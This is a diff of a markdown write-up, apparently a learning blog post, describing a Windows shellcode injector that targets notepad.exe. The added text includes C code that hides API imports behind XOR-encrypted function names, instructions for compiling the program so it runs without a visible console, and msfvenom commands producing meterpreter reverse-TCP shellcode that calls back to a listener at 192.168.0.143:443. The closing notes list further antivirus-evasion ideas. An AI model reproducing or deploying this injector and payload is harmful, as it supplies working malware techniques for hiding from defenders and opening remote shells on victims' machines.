@@ -39,6 +39,7 @@ This injector has the following properties:
 - The strings to calculate the pointer to the API functions using the aforementioned technique are also encrypted with the same XOR key used for the shellcode, in order to obfuscate the strings.
 - The XOR key is also stored as a resource in the executable.
 - The program in which it injects into is `notepad.exe`. The injector obtains the PID given the process name and uses the PID to inject into. 
+- The program is compiled as a **Windows Subsystem program**, and not as a console program, in order to avoid a CMD popping on screen when the dropper gets executed.
 
 The API calls performed in this executable are simple:
 - `FindResource` and `LoadResource` to obtain the embedded resources in the executable.
@@ -55,9 +56,79 @@ The injector has the following phases:
 
 The result is a thread in the remote process executing our shellcode.
 
-## Evasion techniques
-Here is a detailed overview of each of the things I implemented in the program to make it stealthier, both statically and dinamically. Overall, I think that it is missing a lot of evasion techniques but as I repeated before, I am just learning slowly to know what I am exactly doing without copypasting.
+## Finding PID given process name
+The used Windows API functions to perform the process injection technique require the PID of the process to inject into. A function that dinamically obtains the PID of a given process name at runtime was implemented in the injector using some of the Windows API calls.
 
+The function is the following:
+
+```c
+int findMyProc(wchar_t* procname) {
+
+	HANDLE hSnapshot; // Handle to the system process snapshot.
+	PROCESSENTRY32 pe;
+	int pid = 0;
+	BOOL hResult;
+
+	printf("Searching for the process %ls to get its PID...\n", procname);
+
+	// snapshot of all processes in the system
+	unsigned char CreateToolhelp32SnapshotEncrypted[] = { 0x2A, 0xC4, 0xAB, 0x42, 0x50, 0x6D, 0xBE, 0x0C, 0x0F, 0xF3, 0xCB, 0xE1, 0x66, 0x62, 0x98, 0xBA, 0xCF, 0xD0, 0x42, 0xC9, 0x58, 0x3B, 0x93, 0xA2, 0xB3 };
+	XOR(CreateToolhelp32SnapshotEncrypted, sizeof(CreateToolhelp32SnapshotEncrypted), key, key_len);
+	auto const pCreateToolhelp32Snapshot = reinterpret_cast<LPVOID(WINAPI*)(DWORD dwFlags, DWORD th32ProcessID)>(
+		GetProcAddress(hKernel32, (LPCSTR)CreateToolhelp32SnapshotEncrypted)
+		);
+	hSnapshot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+	// It is neccesary to initialize the size of the process entry.
+	/* Before calling the Process32First function, set this member to sizeof(PROCESSENTRY32). If you do not initialize dwSize,
+	Process32First fails (https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32) */
+	pe.dwSize = sizeof(PROCESSENTRY32W);
+
+	// Retrieve infrormation about first process encountered in a system snapshot
+	unsigned char Process32FirstWEncrypted[] = { 0x39, 0xC4, 0xA1, 0x40, 0x41, 0x7B, 0x99, 0x50, 0x52, 0xD9, 0xCA, 0xF6, 0x79, 0x66, 0xFC, 0x88 };
+	XOR(Process32FirstWEncrypted, sizeof(Process32FirstWEncrypted), key, key_len);
+	auto const pProcess32FirstW = reinterpret_cast<BOOL(WINAPI*)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)>(
+		GetProcAddress(hKernel32, (LPCSTR)Process32FirstWEncrypted)
+		);
+	hResult = pProcess32FirstW(hSnapshot, &pe);
+
+	// Get information about the obtained process using its handle
+	// and exit if unsuccessful
+	unsigned char Process32NextWEncrypted[] = { 0x39, 0xC4, 0xA1, 0x40, 0x41, 0x7B, 0x99, 0x50, 0x52, 0xD1, 0xC6, 0xFC, 0x7E, 0x45, 0xAB };
+	XOR(Process32NextWEncrypted, sizeof(Process32NextWEncrypted), key, key_len);
+	auto const pProcess32NextW = reinterpret_cast<BOOL(WINAPI*)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)>(
+		GetProcAddress(hKernel32, (LPCSTR)Process32NextWEncrypted)
+		);
+	while (pProcess32NextW(hSnapshot, &pe)) {
+		if (lstrcmpW(pe.szExeFile, procname) == 0) {
+			pid = pe.th32ProcessID;
+			break;
+		}
+	}
+
+	// Close the open handle; we don't need it anymore
+	CloseHandle(hSnapshot);
+	return pid;
+}
+```
+
+Note that this function **will return the first PID occurrence related to the process specified; if there are two process called notepad.exe, it will return the first one that is found in the snapshot obtained calling `CreateToolhelp32Snapshot`** (a lot of factors influence in the first returned PID).
+## Evasion techniques
+Here is a detailed overview of each of the things I implemented in the program to make it stealthier, both statically and dinamically. Overall, I think that it is missing a lot of evasion techniques but as I repeated before, I am just learning slowly to know what I am exactly doing without copypasting. 
+### Windows Subsystem
+The program is compiled specifying `WINDOWS` as the subsystem and not `CONSOLE` as the subsystem in order to avoid the OS allocating a console when the file is executed. 
+In order to do this, we first need to compile the file specifying `WINDOWS` as the `SUBSYSTEM` FLAG:
+
+![](/post_images/firststeps_1.png)
+
+After that, the linker will not search for the main function; instead, it will search for the following function:
+```c
+int WINAPI WinMain(HINSTANCE,HISTANCE,LPSTR,int);
+```
+
+Therefore we must replace our main function with WinMain:
+![](/post_images/firststeps_2.png)
 ### IAT hiding + encrypted strings
 The API calls are resolved dinamically, therefore, not appearing in the IAT of the file.
 Let's see the snippet of the code to obfuscate an API call:
@@ -75,10 +146,14 @@ auto const pVirtualAllocEx = reinterpret_cast<LPVOID(WINAPI*)(HANDLE hProcess, L
 ```
 
 The string is encrypted to not use GetProcAddress and insert the hardcoded "`VirtualAllocEx`" function name. **This would result in the function name appearing as a string in the file.** 
-Given this technique, PE analyzers do not display any information about these calls in the IAT nor in the strings. We can see an example with PExplorer:
+Given this technique, PE analyzers do not display any information about these calls in the IAT nor in the strings. We can see an example with PExplorer, in which none of the used imports is being shown in the IAT:
 
-![](images/firststeps.png)
-![](images/firststeps.png)
+![](/post_images/firststeps.png)
+
+Also, strings related to these calls do not appear in the `strings` section:
+
+![](/post_images/firststeps_3.png)
+
 ### TBD
 
 Static analysis can also be based on specific byte sequences, or bad bytes in executables.
@@ -98,12 +173,12 @@ https://steve-s.gitbook.io/0xtriboulet/deceiving-defender/deceiving-defender-nam
 Stage: msfvenom --platform windows --arch x64 -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.0.143 LPORT=443 -f raw -o meterpreter EXITFUNC=thread
 Non-staged: msfvenom --platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.143 LPORT=443 -f raw -o meterpreter EXITFUNC=thread
 
-Works with stager
 
-![[Pasted image 20240303203124.png]]
 
 
 ideas futuras
 cambiar el algoritmo de envcriptacion
 encriptar con clave en dominio 
 encriptar con clave de hostname, asi solo funciona en la target machine.
+cambiar los protocolos con los que hablarn (en generar, cambiar el agente xD)
+tecnicas mas avanzadas, indirect syscalls
